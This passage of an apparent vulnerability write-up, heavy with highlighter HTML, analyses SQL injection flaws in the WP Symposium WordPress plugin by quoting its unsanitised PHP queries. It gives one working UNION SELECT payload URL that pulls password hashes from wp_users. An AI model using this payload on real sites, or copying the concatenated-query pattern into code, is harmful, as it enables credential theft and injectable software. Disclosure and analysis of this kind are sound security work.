id="crayon-53c987717c936567816030-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'member_small'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT u.ID FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u WHERE u.display_name LIKE '"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-sy">.</span><span class="crayon-s">"%'"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c987717c936567816030-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-16">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c936567816030-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-i">ID</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-26">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c936567816030-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-28">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c936567816030-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// resolve stubs if using WPS permalinks</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_permalink_structure'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">get_query_var</span><span class="crayon-sy">(</span><span class="crayon-s">'stub'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">stubs</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">'/'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">get_query_var</span><span class="crayon-sy">(</span><span class="crayon-s">'stub'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">stub0</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">stubs</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">stub0</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-34">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c936567816030-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">stub0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT ID FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE replace(display_name, ' ', '') = %s"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">stub0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">last_query</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-44">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c936567816030-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">share</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_symposium_meta</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">uid</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'share'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'UID:'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c936567816030-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">html</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&amp;lt;div id="symposium_current_user_page" style="display:none"&amp;gt;'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;/div&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-48">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c936567816030-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">share</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'public'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c936567816030-50">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c936567816030-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">user</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT display_name FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE ID = "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">uid</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0227 seconds] -->
<p>Note that the last line takes the $uid variable as determined on the first block of code, and simply puts it straight into the query without any sort of input sanitation. So by creating a page with the &#8220;[symposium-profile-menu]&#8221; short-tag, we can inject into the page with a simple URL like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c942893145003" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/?page_id=52&amp;uid=3535 UNION SELECT user_pass from wp_users</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c942893145003-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c942893145003-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?page_id=52&amp;uid=3535 UNION SELECT user_pass from wp_users</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p><strong>Analysis of forum updateEditDetail blind SQL injection vulnerability</strong></p>
<p>This vulnerability is actually more like 2. We can see that in this standard ajax call in <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/ajax/symposium_forum_functions.php">/ajax/symposium_forum_functions.php</a> file that there is a total of 4 SQL queries executed, 2 updates and 2 selects. Notice that the $_POST parameters aren&#8217;t sanitized before use, yet all but the 3rd query uses concatenation to create the SQL query, which creates SQL injection conditions if you are logged in.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c94c588848511" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// AJAX function to update topic details after editing
if ($_POST['action'] == 'updateEditDetails') {

	if (is_user_logged_in()) {

		$tid = $_POST['tid'];	

		$topic_subject = $_POST['topic_subject'];	
		$topic_post = $_POST['topic_post'];

		if (get_option('symposium_striptags') == 'on') {
			$topic_subject = strip_tags($topic_subject);	
			$topic_post = strip_tags($topic_post);	
		}

		$topic_post = str_replace("\n", chr(13), $topic_post);	
		$topic_category = $_POST['topic_category'];

		// Ensure safe HTML
		$topic_subject = str_replace("&lt;", "&amp;lt;", $topic_subject);	
		$topic_subject = str_replace("&gt;", "&amp;gt;", $topic_subject);	
		if (get_option('symposium_use_wysiwyg') != 'on') {
			$topic_post = str_replace("&lt;", "&amp;lt;", $topic_post);	
			$topic_post = str_replace("&gt;", "&amp;gt;", $topic_post);
		}

		if ($topic_category == "") {
			$topic_category = $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT topic_category FROM ".$wpdb-&gt;prefix.'symposium_topics'." WHERE tid = ".$tid));
		}

		$wpdb-&gt;query( $wpdb-&gt;prepare("UPDATE ".$wpdb-&gt;prefix."symposium_topics SET topic_category = ".$topic_category." WHERE topic_parent = ".$tid) );

		$sql = "UPDATE ".$wpdb-&gt;prefix."symposium_topics SET topic_subject = %s, topic_post = %s, topic_category = %d WHERE tid = %d";
		$wpdb-&gt;query( $wpdb-&gt;prepare($sql, $topic_subject, $topic_post, $topic_category, $tid) );

		$parent = $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT topic_parent FROM ".$wpdb-&gt;prefix.'symposium_topics'." WHERE tid = ".$tid));

	}

	exit;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1644">1644</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1645">1645</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1646">1646</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1647">1647</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1648">1648</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1649">1649</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1650">1650</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1651">1651</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1652">1652</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1653">1653</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1654">1654</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1655">1655</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1656">1656</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1657">1657</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1658">1658</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1659">1659</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1660">1660</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1661">1661</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1662">1662</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1663">1663</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1664">1664</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1665">1665</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1666">1666</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1667">1667</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1668">1668</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1669">1669</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1670">1670</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1671">1671</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1672">1672</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1673">1673</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1674">1674</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1675">1675</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1676">1676</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1677">1677</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1678">1678</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1679">1679</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1680">1680</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1681">1681</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1682">1682</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c94c588848511-1683">1683</div><div class="crayon-num" data-line="crayon-53c987717c94c588848511-1684">1684</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c94c588848511-1644"><span class="crayon-c">// AJAX function to update topic details after editing</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1645"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'updateEditDetails'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1646">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1647"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1648">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1649"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$tid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'tid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987717c94c588848511-1650">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c94c588848511-1651"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_subject'</span><span class="crayon-sy">]</span><span 